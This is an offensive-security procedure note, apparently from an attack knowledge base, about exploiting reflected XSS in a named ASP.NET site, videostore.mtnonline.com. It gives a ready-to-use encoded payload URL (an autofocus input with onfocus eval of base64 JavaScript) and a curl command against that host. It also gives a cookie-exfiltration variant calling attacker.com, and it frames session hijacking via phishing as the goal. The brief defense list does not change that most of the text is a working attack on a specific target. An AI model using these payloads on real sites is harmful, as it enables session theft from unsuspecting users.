---
tags:
  - xss
  - exploitation
  - javascript
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-execute-xss]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:08.315Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 6f8da3ab-eeed-4352-9d16-efc14a8a8083
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft and Execute XSS Payload

## Summary

This procedure crafts a malicious URL payload to exploit reflected XSS in ASP.NET parameters, executing JavaScript like an alert or data exfiltration in the victim's browser.

## Description

Building on confirmed injection points, craft a payload that breaks out of the parameter context using quotes and tags, then injects an event handler (e.g., onfocus with eval of base64 JS). The example uses an input element with autofocus to trigger on page load. In production, this can hijack sessions by sending cookies to an attacker server. Target: videostore.mtnonline.com/GL/MyAccount.aspx parameters.

## Requirements

1. Confirmed vulnerable parameters
2. URL encoding knowledge
3. Victim to visit the link (e.g., via phishing)

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all inputs with libraries like AntiXSS
- Implement HTTP-only cookies to prevent JS access
- Detect anomalous JS execution via client-side monitoring

## Objectives

1. Execute arbitrary JS in browser context
2. Demonstrate potential for data theft
3. Validate exploitation for session hijacking

## Instructions

### Step 1: Encode and Craft Payload

**Context**: Create a breakout payload using URL encoding.

Use base64 for JS: alert('XSS') encodes to YWxlcnQoJ1hTUycp. Payload: %27><input onfocus=eval(atob('YWxlcnQoJ1hTUycp')) autofocus>

Full URL: https://videostore.mtnonline.com/GL/MyAccount.aspx?PId=126&CID=5&OprId=11%27%3E%3Cinput%20onfocus=eval(atob(%27YWxlcnQoJ1hTUycp%27))%20autofocus%3E

**Expected Output**: Encoded URL ready for testing.

### Step 2: Execute and Verify

**Context**: Send the payload and trigger execution.

Execute [[commands/curl-execute-xss]] or paste URL in browser. Focus on the injected input to trigger.

```bash
curl -s "https://videostore.mtnonline.com/GL/MyAccount.aspx?PId=126&CID=5&OprId=11%27%3E%3Cinput%20onfocus=eval(atob(%27YWxlcnQoJ1hTUycp%27))%20autofocus%3E" > response.html && grep -i "input onfocus" response.html
```

> Inspect response.html in browser; autofocus should trigger alert('XSS').

**Expected Output**: JavaScript alert pops, confirming execution. For exfil, replace with fetch('http://attacker.com?cookie='+document.cookie).

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-execute-xss]]

## Tools Used


## Tags

- [[xss]]
- [[exploitation]]
- [[JavaScript]]
